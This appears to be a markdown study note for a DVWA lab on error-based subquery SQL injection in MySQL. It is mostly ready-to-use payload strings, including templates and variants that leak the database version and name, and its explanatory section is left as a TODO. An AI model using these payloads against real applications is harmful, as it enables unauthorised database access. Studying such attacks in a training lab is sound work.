# 01 - Database Reconnaissance

Search Tag(s): #sql-injection #error-based #dvwa

## 1.1 - SubQuery Injection

TODO: Fill the information with a step by step approach using error-based subquery SQL injection

```sql
1' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT((<SQL_Payload>),':',FLOOR(RAND(0) * 2)) grouped_table FROM information_schema.tables GROUP BY grouped_table) tblname_alias)#

1' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT((<SQL_Payload>),0x3a,FLOOR(RAND(0) * 2)) grouped_table FROM information_schema.tables GROUP BY grouped_table) tblname_alias)#

1' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT(':', ':', (<SQL_Payload>),':', ':',FLOOR(RAND(0) * 2)) grouped_table FROM information_schema.tables GROUP BY grouped_table) tblname_alias)#

1' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a, 0x3a, (<SQL_Payload>),0x3a, 0x3a, FLOOR(RAND(0) * 2)) grouped_table FROM information_schema.tables GROUP BY grouped_table) tblname_alias)#
```

## 1.2 - Enumeration and Discovery

### 1.2.1 - Banner Grab

```sql
1' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT VERSION()),':',FLOOR(RAND(0) * 2)) grouped_table FROM information_schema.tables GROUP BY grouped_table) tblname_alias)#
```

### 1.2.2 - Current Database

```sql
1' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),':',FLOOR(RAND(0) * 2)) grouped_table FROM information_schema.tables GROUP BY grouped_table) tblname_alias)#
```

---
## References

- [SecurityIdiots: Error-Based Injection Subquery Injection](https://securityidiots.com/Web-Pentest/SQL-Injection/Error-Based-Injection-Subquery-Injection.html)

- [PayloadsAllTheThings SQL Injection: MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)

### Videos

- [SQL Injection Master Course - Lecture 16 - Important 26 Commands for Advance SQL Injection](https://www.youtube.com/watch?v=Be60oqlFYHw)

- [SQL Injection Master Course - Lecture 17 - Double Query Injection](https://www.youtube.com/watch?v=QFy1Ejn-5mU)